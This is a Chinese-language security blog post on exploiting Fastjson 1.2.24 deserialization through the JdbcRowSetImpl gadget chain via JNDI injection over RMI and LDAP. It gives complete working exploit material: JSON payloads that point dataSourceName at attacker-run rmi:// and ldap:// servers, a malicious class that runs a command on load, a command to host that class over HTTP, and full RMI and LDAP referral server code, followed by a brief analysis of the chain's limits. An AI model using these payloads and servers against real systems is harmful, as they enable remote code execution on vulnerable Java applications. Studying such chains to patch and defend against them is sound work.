## 简介

对于TemplatesImpl链来讲，局限相对较大，需要传入特定的参数以及需要特定的格式，本文的JdbcRowSetImpl利用链利用范围会比TemplatesImpl利用链的利用范围要大一些，但是同样也有着一些限制。

基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。

JdbcRowSetImpl类位于 `com.sun.rowset.JdbcRowSetImpl` ，是 `javax.naming.InitialContext#lookup()` 参数可控导致的 JNDI 注入。

#### 限制

由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。

基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191。

### JNDI+RMI

POC：

```java
import com.alibaba.fastjson.JSON;


public class JNDI_Test {
    public static void main(String[] args) throws Exception {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/calc\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

TouchFile.java

```java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

编译后开一个http服务挂起

```
python -m http.server 9999
```

rmiserver.java

```java
package test;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class rmiserver {

    public static void main(String[] args) throws Exception{
        Registry registry= LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("evil3", "evil3", "http://localhost:9999/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("calc", wrapper);

    }
}
```

运行即可弹出计算器：

![image-20220704160944974](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220704160944974.png)

简单分析一下：

利用反射触发setAutoCommit方法，跟进

```java
public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }

    }
```

由于第一次初始化肯定conn为null，跟进`this.connect`

![image-20220704162041022](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220704162041022.png)

我们如果控制了 `dataSourceName`就可以利用 JNDI 注入让客户端进行命令执行了，而这里`dataSourceName`恰恰可以控制，所以此处远程加载了我们HTTP服务上的恶意class

### JNDI+LDAP

POC：

```java
import com.alibaba.fastjson.JSON;


public class JNDI_Test {
    public static void main(String[] args) throws Exception {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:7777/evil3\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}

```

LdapServer.Java

```java
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LdapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:9999/#evil3"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

运行弹出计算器：

![image-20220704163456795](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220704163456795.png)



### 总结

在分析完之后我们再来梳理一下，产生漏洞的原因，以及1.2.24 中利用方法的限制

1. TemplatesImpl 链

优点：当fastjson不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功）

缺点：版本限制 1.2.22 起才有 SupportNonPublicField 特性，并且后端开发需要特定语句才能够触发，在使用parseObject 的时候，必须要使用 `JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)`

2. JdbcRowSetImpl 链

优点：利用范围更广，即触更为容易

缺点：当fastjson 不出网的话这个方法基本上都是gg（在实际过程中遇到了很多不出网的情况）同时高版本jdk中codebase默认为true，这样意味着，我们只能加载受信任的地址 







参考：

https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247484040&amp;idx=1&amp;sn=2f52bd47f8ef3ddc49f134e5c8deba19&amp;chksm=cf0322c5f874abd3715e29485a7eb3ecbb2cd9600e0965977bae74d5d8fc258f1f51c20d3312&token=485956183&lang=zh_CN#rd

https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE

https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Bypass/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType.md